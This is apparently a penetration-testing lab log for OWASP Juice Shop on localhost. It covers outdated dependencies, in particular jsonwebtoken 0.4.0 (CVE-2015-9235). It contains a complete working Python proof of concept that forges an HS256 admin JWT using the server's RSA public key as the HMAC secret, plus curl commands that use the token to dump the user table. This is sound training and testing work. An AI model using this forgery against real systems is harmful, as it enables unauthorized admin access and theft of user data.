# Commands Log — OWASP A06: Vulnerable and Outdated Components (Juice Shop)

## Setup
cd ~/Alrazzaq_Labs/OWASP-Top-10
mkdir -p 06-Vulnerable-Components/raw-output 06-Vulnerable-Components/screenshots
cd 06-Vulnerable-Components
touch README.md commands.md findings.md methodology.md remediation.md

## Retrieve dependency manifest directly from the container
docker exec owasp-juice-shop-a01 cat /juice-shop/package.json
# Result: "cat" not present in container PATH (minimal base image)

docker cp owasp-juice-shop-a01:/juice-shop/package.json raw-output/package.json
cat raw-output/package.json
# Identified dependencies pinned to old exact versions rather than caret ranges:
#   "jsonwebtoken": "0.4.0"
#   "express-jwt": "0.1.3"
#   "sanitize-html": "1.4.2"

## Confirm resolved (actually installed) versions via lockfile
docker cp owasp-juice-shop-a01:/juice-shop/package-lock.json raw-output/package-lock.json
grep -A 3 '"jsonwebtoken"' raw-output/package-lock.json | head -20
grep -B 2 -A 5 '"node_modules/jsonwebtoken"' raw-output/package-lock.json
# Result: resolved version confirmed as 0.4.0, with npm registry metadata itself flagging:
# "deprecated": "Critical vulnerability fix in v5.0.0. See https://auth0.com/blog/..."

## CVE research (web search, not local commands) confirmed:
#   jsonwebtoken 0.4.0  -> CVE-2015-9235 (Critical, 9.8) - algorithm confusion / signature bypass, fixed 4.2.2
#   express-jwt 0.1.3   -> CVE-2020-15084 (High/Critical) - authorization bypass, fixed 6.0.0
#   sanitize-html 1.4.2 -> CVE-2016-1000237 (XSS), fixed 1.4.3

## Confirm live signing algorithm in use
curl -s -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"vulncheck@test.com","password":"Testing123!","passwordRepeat":"Testing123!"}' \
  -o raw-output/register_new_user.json

curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"vulncheck@test.com","password":"Testing123!"}' \
  -o raw-output/fresh_login.json

cat raw-output/fresh_login.json | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
token = data['authentication']['token']
header_b64 = token.split('.')[0]
header_b64 += '=' * (-len(header_b64) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(header_b64)), indent=2))
"
# Result: {"typ": "JWT", "alg": "RS256"}

## Retrieve the RSA public key used to verify tokens
curl -s http://localhost:3000/encryptionkeys/jwt.pub \
  -o raw-output/jwt_public_key.pem
cat raw-output/jwt_public_key.pem

## Forge an HS256 token signed with the RSA public key as the HMAC secret (CVE-2015-9235 PoC)
python3 << 'PYEOF'
import hmac, hashlib, base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header = {"typ": "JWT", "alg": "HS256"}
payload = {
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin"
    },
    "iat": 1893456000
}

header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
signing_input = header_b64 + b'.' + payload_b64

with open('raw-output/jwt_public_key.pem', 'rb') as f:
    pubkey = f.read()

signature = hmac.new(pubkey, signing_input, hashlib.sha256).digest()
sig_b64 = b64url(signature)

forged_token = (signing_input + b'.' + sig_b64).decode()
print(forged_token)

with open('raw-output/forged_hs256_token.txt', 'w') as f:
    f.write(forged_token)
PYEOF

## Control: confirmed a genuinely admin-gated endpoint (not the public config endpoint)
curl -s -X GET http://localhost:3000/api/Users \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 401 UnauthorizedError: No Authorization header was found (confirms endpoint is gated)

## Test: submit the forged token against the same admin-gated endpoint
FORGED=$(cat raw-output/forged_hs256_token.txt)
curl -s -X GET http://localhost:3000/api/Users \
  -H "Authorization: Bearer $FORGED" \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/forged_admin_test.json

cat raw-output/forged_admin_test.json
# Result: 200 OK - full user table returned, including all admin accounts, using a
# self-forged token with no valid credentials or server-side secret required
